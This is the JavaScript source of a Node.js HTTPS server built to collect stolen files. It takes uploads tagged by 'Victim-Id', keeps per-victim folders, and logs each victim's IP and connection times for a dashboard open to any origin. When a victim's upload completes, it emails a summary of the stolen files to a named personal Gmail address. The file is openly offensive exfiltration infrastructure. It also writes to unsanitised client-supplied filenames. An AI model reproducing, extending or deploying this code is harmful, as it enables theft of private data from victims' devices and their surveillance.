const fs = require('fs');
require('dotenv').config();
const cors = require('cors');
const express = require('express');
const https = require('https');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8443;

const sslOptions = {
  key: process.env.SSL_KEY,
  cert: process.env.SSL_CERT
};

// Enable CORS with specific options
const corsOptions = {
  origin: '*', // Allow all origins (for testing)
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));

// Serve the dashboard as static files
app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));

// Middleware to handle raw binary data for file uploads
app.use((req, res, next) => {
  const contentType = req.headers['content-type'] || '';
  if (contentType.startsWith('application/octet-stream') && req.url.startsWith('/upload')) {
    express.raw({ type: 'application/octet-stream', limit: '100mb' })(req, res, next);
  } else {
    next();
  }
});

// Base directory for storing files
const OUTPUT_BASE_DIR = path.join(__dirname, 'received_files');
if (!fs.existsSync(OUTPUT_BASE_DIR)) {
  fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
}

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

const victimFolders = {};
const victimFileCounts = {};
const victimTotalFiles = {};
const victimFiles = {};
const connectedDevices = {};

// Function to send email
async function sendEmail(victimId, files) {
  console.log(`🔍 Preparing to send email for victim ${victimId}...`);

  const fileRows = files.map((file, index) =>
    `<tr>
      <td>${index + 1}</td>
      <td>${file.name}</td>
      <td>${file.type}</td>
      <td>${file.size} bytes</td>
    </tr>`
  ).join('');

  const htmlContent = `
    <h2>Files Received from Victim ${victimId}</h2>
    <p>The following files were received:</p>
    <table border="1">
      <tr>
        <th>#</th>
        <th>File Name</th>
        <th>File Type</th>
        <th>File Size</th>
      </tr>
      ${fileRows}
    </table>`;

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: 'naseer.ord@gmail.com',
    subject: `Files Received from Victim ${victimId}`,
    html: htmlContent,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log(`✅ Email sent: ${info.response}`);
  } catch (error) {
    console.error(`❌ Error sending email:`, error.message);
  }
}

// Function to check if all files are received and send email
async function checkAndSendEmail(victimId, victimFolder) {
  const filesInFolder = fs.readdirSync(victimFolder);
  if (filesInFolder.length === victimTotalFiles[victimId]) {
    console.log(`✅ All files received for victim ${victimId}, sending email...`);

    const files = filesInFolder.map((filename) => {
      const filePath = path.join(victimFolder, filename);
      const stats = fs.statSync(filePath);
      return { name: filename, type: path.extname(filename).substring(1), size: stats.size };
    });

    victimFiles[victimId] = files;
    sendEmail(victimId, files);
  }
}

// Route to handle file uploads
app.post('/upload', (req, res) => {
  let filename = decodeURIComponent(req.headers['filename']);
  let victimId = decodeURIComponent(req.headers['victim-id']);
  let ip = req.ip;

  if (!connectedDevices[victimId]) {
    connectedDevices[victimId] = {
      ip: ip,
      connectionTime: new Date(),
      lastConnectionTime: new Date(),
      filesTransferred: 0,
      fileList: []
    };
  } else {
    connectedDevices[victimId].lastConnectionTime = new Date();
  }

  if (!victimFolders[victimId]) {
    const timestamp = new Date().toISOString().replace(/:/g, '-');
    victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
    fs.mkdirSync(victimFolders[victimId], { recursive: true });
    victimFileCounts[victimId] = 0;
    victimTotalFiles[victimId] = parseInt(req.headers['total-files'], 10);
  }

  const victimFolder = victimFolders[victimId];
  const filePath = path.join(victimFolder, filename);

  fs.appendFile(filePath, req.body, (err) => {
    if (err) {
      console.error(`❌ Error writing file:`, err);
      return res.status(500).send('Error saving file');
    }

    console.log(`✅ File received: ${filename}`);
    victimFileCounts[victimId] += 1;
    connectedDevices[victimId].filesTransferred += 1;
    connectedDevices[victimId].fileList.push(filename);

    checkAndSendEmail(victimId, victimFolder);
    res.status(200).send('OK');
  });
});

// Route to provide dashboard data
app.get('/dashboard-data', (req, res) => {
  res.json(connectedDevices);
});

// Start the server
https.createServer(sslOptions, app).listen(PORT, () => {
  console.log(`🔐 HTTPS server is running on https://localhost:${PORT}`);
});